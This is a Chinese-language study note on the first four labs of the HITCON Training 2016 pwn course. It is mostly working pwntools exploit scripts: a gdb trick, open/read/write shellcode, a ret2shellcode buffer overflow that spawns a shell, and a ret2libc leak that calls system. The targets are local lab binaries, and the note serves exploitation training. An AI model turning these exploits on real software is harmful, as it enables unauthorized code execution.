# Angelboy_HITCON_Training_2016 - Notes
> 前言:
>
> 其實每個 lab 下都有解答了，純粹紀錄和學習下，然後應該也不歸類在 wargame 就是，但不知道放哪

當初是看到這個[網站](https://veritas501.space/2017/05/23/HITCON-training%20writeup/)才知道的


## lab1

單純 gdb 練習

```
gdb

b *get_flag+389
set $eax=$edx
c
```

## lab2

保護都沒開，感覺就是 ret2shellcode

ida pro 看一下，就是輸入以後會直接執行，然後然後只允許 open/read/write

假設 flag 在當前目錄好了，就是 cat ./flag 這樣

```python
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab2/orw.bin')

sh = open("a.bin", "rb").read()
r.sendlineafter(':', sh)


r.interactive()


"""
jmp sh
orw:
 pop ebx
 mov eax, 0x5
 xor ecx,ecx
 int 0x80

 mov ebx, eax
 mov eax, 0x3
 mov ecx, esp
 mov edx, 0x100
 int 0x80

 mov edx, eax
 mov eax, 0x4
 mov ebx, 0x1
 int 0x80

 mov eax, 0x1
 xor ebx, ebx
 int 0x80
sh:
 call orw
 db 'flag', 0
"""
```


## lab3

這題名字就是 ret2shellcode @@ ，然後保護也沒開應該就是了

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('/tmp/HITCON-Training/LAB/lab3/ret2sc')

name = 0x804a060
r.sendlineafter(':', asm(shellcraft.sh()))
r.sendlineafter(':', "a"*32 + p32(name))
r.interactive()
```

## lab4

ret2libc 沒什麼好說的

```
#!/usr/bin/env python
from pwn import *
context.arch = 'i386'
r = process('./ret2lib')

puts_got = 134520860
puts_off = 0x005fca0
system_off = 0x0003ada0
r.sendlineafter('address (in dec) :', str(puts_got))
info(r.recvuntil('the address : '))
libc = int(r.recvuntil('\n')[:-1], 16) - puts_off
info("libc: "+hex(libc))
system = system_off + libc
sh = libc + 0x15BA0B
trash = 'a'*60
r.sendlineafter(':', trash + flat([system, sh, sh]))


r.interactive()
```





